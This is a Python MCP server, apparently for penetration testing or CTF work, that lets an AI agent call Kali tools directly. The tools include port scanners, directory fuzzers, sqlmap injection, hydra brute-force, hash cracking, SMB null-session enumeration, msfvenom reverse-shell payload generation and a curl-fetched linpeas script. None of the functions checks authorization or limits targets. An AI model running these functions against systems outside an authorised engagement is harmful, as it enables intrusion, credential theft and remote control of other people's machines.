#!/usr/bin/env python3
"""
HATS MCP Server — Direct subprocess implementation.
Calls Kali tools directly with correct flags. No HATS import, no asyncio conflicts.
"""

from __future__ import annotations
import json
import os
import re
import shlex
import shutil
import subprocess
from typing import Any


def _import_fastmcp():
    try:
        from fastmcp import FastMCP  # type: ignore
        return FastMCP
    except Exception:
        from mcp.server.fastmcp import FastMCP  # type: ignore
        return FastMCP


FastMCP = _import_fastmcp()
mcp = FastMCP("hats-mcp-server")

TIMEOUT = int(os.getenv("HATS_TIMEOUT_SECONDS", "300"))


def _run(cmd: list[str], timeout: int = TIMEOUT) -> dict[str, Any]:
    """Run a command directly. Returns structured result dict."""
    binary = cmd[0]
    if not shutil.which(binary):
        return {
            "success": False,
            "error": f"'{binary}' not found. Install: sudo apt install -y {binary}",
            "command": " ".join(shlex.quote(c) for c in cmd),
        }
    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout, check=False
        )
        stdout = (proc.stdout or "").strip()
        stderr = (proc.stderr or "").strip()
        parsed: Any = None
        try:
            parsed = json.loads(stdout)
        except (json.JSONDecodeError, ValueError):
            pass
        return {
            "command": " ".join(shlex.quote(c) for c in cmd),
            "return_code": proc.returncode,
            "stdout": stdout[:60000],
            "stderr": stderr[:4000],
            "parsed_json": parsed,
            "success": proc.returncode == 0,
        }
    except subprocess.TimeoutExpired:
        return {"success": False, "error": f"Timed out after {timeout}s",
                "command": " ".join(shlex.quote(c) for c in cmd)}
    except Exception as exc:
        return {"success": False, "error": str(exc),
                "command": " ".join(shlex.quote(c) for c in cmd)}


# ── TOOL HEALTH ──────────────────────────────────────────────────────────────

KALI_TOOLS = [
    "nmap", "masscan", "rustscan", "gobuster", "nikto", "ffuf", "nuclei",
    "whatweb", "sqlmap", "hydra", "john", "hashcat", "hashid", "searchsploit",
    "msfvenom", "enum4linux", "smbclient", "smbmap", "dnsrecon", "dnsenum",
    "tcpdump", "nc", "binwalk", "steghide", "wfuzz", "fierce", "crunch",
    "linpeas.sh",
]


@mcp.tool()
def hats_check_tools() -> dict[str, Any]:
    """Check which Kali Linux security tools are installed. Run before starting any pentest."""
    installed, missing = {}, []
    for t in KALI_TOOLS:
        p = shutil.which(t)
        if p:
            installed[t] = p
        else:
            missing.append(t)
    return {
        "installed_count": len(installed),
        "missing_count": len(missing),
        "installed": installed,
        "missing": missing,
        "install_command": f"sudo apt install -y {' '.join(missing)}" if missing else None,
        "success": True,
    }


# ── RECONNAISSANCE ────────────────────────────────────────────────────────────

@mcp.tool()
def hats_nmap_scan(target: str, ports: str = "1-1000", flags: str = "-sV -sC") -> dict[str, Any]:
    """Nmap port/service scan. Returns open ports, services, versions. Use for initial recon."""
    cmd = ["nmap"] + flags.split() + ["-p", ports, target]
    return _run(cmd)


@mcp.tool()
def hats_masscan(target: str, ports: str = "1-65535", rate: str = "1000") -> dict[str, Any]:
    """Ultra-fast TCP port scan. Use before nmap to discover open ports quickly."""
    cmd = ["masscan", target, f"-p{ports}", f"--rate={rate}"]
    return _run(cmd, timeout=120)


@mcp.tool()
def hats_whatweb(target: str) -> dict[str, Any]:
    """Identify web technologies, CMS, server versions on a URL."""
    cmd = ["whatweb", "--log-brief=/dev/stdout", target]
    return _run(cmd)


@mcp.tool()
def hats_dnsrecon(domain: str, record_type: str = "std") -> dict[str, Any]:
    """DNS enumeration: zone transfers, subdomains, MX/NS/SOA. record_type: std|axfr|brute"""
    cmd = ["dnsrecon", "-d", domain, "-t", record_type]
    return _run(cmd)


@mcp.tool()
def hats_enum4linux(target: str) -> dict[str, Any]:
    """Enumerate SMB/NetBIOS/AD: users, shares, groups, password policies."""
    cmd = ["enum4linux", "-a", target]
    return _run(cmd, timeout=120)


# ── WEB APPLICATION ───────────────────────────────────────────────────────────

@mcp.tool()
def hats_gobuster(
    target: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    threads: str = "10",
) -> dict[str, Any]:
    """Directory/file brute-force on a web server. Discovers hidden paths and endpoints."""
    cmd = ["gobuster", "dir", "-u", target, "-w", wordlist, "-t", threads, "-q"]
    return _run(cmd, timeout=180)


@mcp.tool()
def hats_nikto(target: str) -> dict[str, Any]:
    """Web server vulnerability scanner. Checks for dangerous files, misconfigs, old software."""
    cmd = ["nikto", "-h", target, "-nointeractive"]
    return _run(cmd, timeout=300)


@mcp.tool()
def hats_ffuf(
    url_with_fuzz: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    extra_flags: str = "-mc 200,301,302,403",
) -> dict[str, Any]:
    """Fast web fuzzer. URL must contain FUZZ keyword (e.g. http://target/FUZZ)."""
    cmd = ["ffuf", "-u", url_with_fuzz, "-w", wordlist] + extra_flags.split()
    return _run(cmd, timeout=180)


@mcp.tool()
def hats_nuclei(target: str, severity: str = "critical,high") -> dict[str, Any]:
    """Template-based CVE/vuln scanner. severity: critical,high,medium,low,info"""
    cmd = ["nuclei", "-u", target, "-severity", severity, "-silent", "-nc"]
    return _run(cmd, timeout=300)


# ── EXPLOITATION ──────────────────────────────────────────────────────────────

@mcp.tool()
def hats_sqlmap(
    target_url: str,
    data: str = "",
    level: str = "1",
    risk: str = "1",
) -> dict[str, Any]:
    """Automated SQL injection detection. Provide a URL with injectable parameters."""
    cmd = ["sqlmap", "-u", target_url, "--batch", "--random-agent",
           f"--level={level}", f"--risk={risk}"]
    if data:
        cmd += ["--data", data]
    return _run(cmd, timeout=300)


@mcp.tool()
def hats_hydra(
    target: str,
    service: str = "ssh",
    username: str = "admin",
    password_list: str = "/usr/share/wordlists/rockyou.txt",
    threads: str = "4",
) -> dict[str, Any]:
    """Online brute-force. service: ssh|ftp|http-post-form|rdp|smb|telnet"""
    cmd = ["hydra", "-l", username, "-P", password_list,
           "-t", threads, "-f", target, service]
    return _run(cmd, timeout=300)


@mcp.tool()
def hats_searchsploit(query: str) -> dict[str, Any]:
    """Search Exploit-DB for exploits matching a service name/version."""
    cmd = ["searchsploit", "--json", query]
    result = _run(cmd, timeout=30)
    # Parse the JSON output from searchsploit if available
    if result.get("parsed_json") is None and result.get("stdout"):
        try:
            result["parsed_json"] = json.loads(result["stdout"])
        except (json.JSONDecodeError, ValueError):
            pass
    return result


@mcp.tool()
def hats_msfvenom(
    payload: str = "linux/x64/shell_reverse_tcp",
    lhost: str = "10.10.14.1",
    lport: str = "4444",
    fmt: str = "elf",
    output: str = "/tmp/payload",
) -> dict[str, Any]:
    """Generate Metasploit payload for authorized exploitation."""
    cmd = ["msfvenom", "-p", payload,
           f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", output]
    return _run(cmd, timeout=60)


# ── PASSWORD CRACKING ─────────────────────────────────────────────────────────

@mcp.tool()
def hats_hashid(hash_string: str) -> dict[str, Any]:
    """Identify hash type (MD5, SHA1, NTLM, bcrypt, etc). Run before cracking."""
    cmd = ["hashid", hash_string]
    return _run(cmd, timeout=10)


@mcp.tool()
def hats_john(
    hash_file: str,
    wordlist: str = "/usr/share/wordlists/rockyou.txt",
    fmt: str = "",
) -> dict[str, Any]:
    """Crack password hashes with John the Ripper."""
    cmd = ["john", hash_file, f"--wordlist={wordlist}"]
    if fmt:
        cmd.append(f"--format={fmt}")
    return _run(cmd, timeout=300)


@mcp.tool()
def hats_hashcat(
    hash_file: str,
    mode: str = "0",
    wordlist: str = "/usr/share/wordlists/rockyou.txt",
) -> dict[str, Any]:
    """GPU hash cracking. mode: 0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt, 3200=bcrypt"""
    cmd = ["hashcat", "-m", mode, hash_file, wordlist, "--force", "-O"]
    return _run(cmd, timeout=300)


# ── POST-EXPLOITATION ─────────────────────────────────────────────────────────

@mcp.tool()
def hats_smbclient(
    target: str,
    share: str = "",
    username: str = "",
    password: str = "",
) -> dict[str, Any]:
    """List/access SMB shares. Leave share blank to list all shares (null session)."""
    if share:
        cmd = ["smbclient", f"//{target}/{share}"]
    else:
        cmd = ["smbclient", "-L", target, "-N"]
    if username:
        cred = f"{username}%{password}" if password else username
        cmd += ["-U", cred]
    return _run(cmd, timeout=30)


@mcp.tool()
def hats_smbmap(
    target: str,
    username: str = "",
    password: str = "",
) -> dict[str, Any]:
    """Enumerate SMB share permissions. Shows read/write access per share."""
    cmd = ["smbmap", "-H", target]
    if username:
        cmd += ["-u", username]
    if password:
        cmd += ["-p", password]
    return _run(cmd, timeout=30)


@mcp.tool()
def hats_linpeas() -> dict[str, Any]:
    """Run LinPEAS on this system for Linux privilege escalation vectors."""
    for candidate in ["/tmp/linpeas.sh", "/usr/share/peass/linpeas.sh"]:
        if os.path.isfile(candidate):
            cmd = ["bash", candidate]
            return _run(cmd, timeout=600)
    return {
        "success": False,
        "error": (
            "linpeas.sh not found. Download it:\n"
            "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest"
            "/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh"
        ),
    }


# ── NETWORK ANALYSIS ─────────────────────────────────────────────────────────

@mcp.tool()
def hats_netcat_banner(target: str, port: str) -> dict[str, Any]:
    """Grab service banner from a specific port."""
    cmd = ["nc", "-w", "5", "-v", target, port]
    return _run(cmd, timeout=10)


# ── FORENSICS ────────────────────────────────────────────────────────────────

@mcp.tool()
def hats_binwalk(file_path: str) -> dict[str, Any]:
    """Analyze firmware/binary files for embedded files and executable code."""
    cmd = ["binwalk", file_path]
    return _run(cmd, timeout=60)


@mcp.tool()
def hats_strings(file_path: str, min_length: str = "6") -> dict[str, Any]:
    """Extract printable strings from a binary. Useful for CTF and malware analysis."""
    cmd = ["strings", f"-n{min_length}", file_path]
    return _run(cmd, timeout=30)


@mcp.tool()
def hats_steghide(
    file_path: str,
    passphrase: str = "",
    action: str = "info",
) -> dict[str, Any]:
    """Steganography tool. action='info' to inspect, 'extract' to extract hidden data."""
    cmd = ["steghide", action, "-sf", file_path, "-p", passphrase]
    return _run(cmd, timeout=30)


# ── SMART CHAINS ─────────────────────────────────────────────────────────────

@mcp.tool()
def hats_full_recon_chain(target: str) -> dict[str, Any]:
    """
    FULL RECON CHAIN — runs sequentially (no asyncio):
      nmap → whatweb (if web ports found) → dnsrecon (if domain) → searchsploit for each service.
    Returns consolidated findings dict.
    """
    results: dict[str, Any] = {"target": target, "phases": {}}

    # 1. Port scan
    nmap = hats_nmap_scan(target, ports="1-10000", flags="-sV -sC -O")
    results["phases"]["nmap"] = nmap
    stdout = nmap.get("stdout", "") or ""

    # 2. Web tech (if web ports open)
    web_ports = ["80/tcp", "443/tcp", "8080/tcp", "8443/tcp", "8000/tcp"]
    if any(p in stdout for p in web_ports):
        scheme = "https" if "443/tcp" in stdout else "http"
        web_target = f"{scheme}://{target}"
        results["phases"]["whatweb"] = hats_whatweb(web_target)

    # 3. DNS recon (if target looks like a domain, not an IP)
    if not re.match(r"^\d+\.\d+\.\d+\.\d+$", target) and "/" not in target:
        results["phases"]["dnsrecon"] = hats_dnsrecon(target)

    # 4. Searchsploit for discovered services
    service_pattern = re.compile(
        r"(\d+)/tcp\s+open\s+\S+\s+(.+)", re.MULTILINE
    )
    services = service_pattern.findall(stdout)
    sploit_results = {}
    for _port, svc in services[:5]:  # limit to first 5 services
        svc_clean = svc.strip().split(" ")[0]
        if svc_clean and len(svc_clean) > 2:
            sploit_results[svc_clean] = hats_searchsploit(svc_clean)
    if sploit_results:
        results["phases"]["searchsploit"] = sploit_results

    results["summary"] = (
        f"Full recon complete for {target}. "
        "Review phases above. Check searchsploit hits for exploit leads."
    )
    return results


@mcp.tool()
def hats_web_recon_chain(url: str) -> dict[str, Any]:
    """WEB RECON CHAIN: whatweb → gobuster → nikto → nuclei. Full web assessment."""
    results: dict[str, Any] = {"target": url, "phases": {}}
    results["phases"]["whatweb"] = hats_whatweb(url)
    results["phases"]["gobuster"] = hats_gobuster(url)
    results["phases"]["nikto"] = hats_nikto(url)
    results["phases"]["nuclei"] = hats_nuclei(url)
    results["summary"] = "Web recon complete. Prioritize nuclei critical/high findings."
    return results


@mcp.tool()
def hats_ad_recon_chain(target: str) -> dict[str, Any]:
    """AD RECON CHAIN: enum4linux → smbclient (null session) → smbmap. Full SMB/AD enum."""
    results: dict[str, Any] = {"target": target, "phases": {}}
    results["phases"]["enum4linux"] = hats_enum4linux(target)
    results["phases"]["smbclient_shares"] = hats_smbclient(target)
    results["phases"]["smbmap"] = hats_smbmap(target)
    results["summary"] = "AD recon complete. Check for null sessions, anonymous shares, user lists."
    return results


if __name__ == "__main__":
    mcp.run()
